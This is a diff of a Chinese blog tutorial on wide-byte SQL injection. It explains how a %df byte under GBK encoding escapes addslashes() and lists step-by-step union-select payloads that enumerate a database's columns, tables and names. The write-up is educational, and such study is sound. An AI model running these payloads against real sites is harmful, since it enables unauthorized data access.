@@ -54,16 +54,16 @@ sequenceDiagrams:
 
 那么，要找到注入点就要想办法从addslashes函数逃逸出来。才能实现引号的闭合。这里存在两种办法：
 
-{% note success, 
-
 1. 把addslashes()函数所添加的反斜杠再添加一个反斜杠，对反斜杠进行转义，即“\\\”。
 2. 想办法让\\消失。
 
 针对第二种方法，利用的是mysql的一个特性，mysql在使用GBK编码时会认为两个字符时一个汉字（前一个ascii码要大于128，才到汉字的范围）
 
-​					’       ->     \\'      ->   %5c%27
+> ​					’       ->     \\'      ->   %5c%27
+>
 
-​				%df     ->  %df\\'  ->   %df%5c%27  -> %}
+> ​				%df     ->  %df\\'  ->   %df%5c%27  -> %}
+>
 
 加入单引号时，addslashes()函数会自动添加反斜杠对单引号进行转移，而mysql使用GBK编码时对字符进行编码\\‘就变成了%5c%27，这个时候如果再在%5c%27前面加上一个字符如“%df”（ascii码大于128的字符即可），mysql在进行GBK编码时，会将两个字符%df%5c认为是一个汉字，这个时候单引号就可以逃逸出来进行单引号闭合。
 
@@ -85,33 +85,41 @@ sequenceDiagrams:
 
 输入:?id=%df 会发现返回了一个乱码（中文乱码）说明%df%5c结合成了一个汉字，反斜杠消失。
 
-![image-20200707122357365](D:%5CBLOG%5C_posts%5CSQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%AE%BD%E5%AD%97%E8%8A%82%5Cimage-20200707122357365.png)
-
 反斜杠消失后即可根据常规单引号闭合注入方法进行sql语句的注入。
 
 ### sql注入步骤
 
 1.查列数，order by + 数字 进行测试
 
+```
 id=%df%27 order by 3 %23
+```
 
 2.查回显位置
 
+```
 ?id=%df%27 union select 1,2,3 %23?
+```
 
 3.查库名
 
+```
 ?id=%df%27 union select 1,database(),3 %23
+```
 
 4.查表名
 
+```
 ?id=%df%27 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23
+```
 
 ![image-20200707123721606](https://cdn.jsdelivr.net/gh/wtnyzhsq/cdnstatic/img/sqlzhuru.png)
 
 5.查列名
 
+```
 ?id=%df%27 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='xxxx'),3 %23
+```
 
 这里输入table_name='users'时，addslashex()函数还会对单引号进行转义。可对users进行hex编码即转为16进制。
 
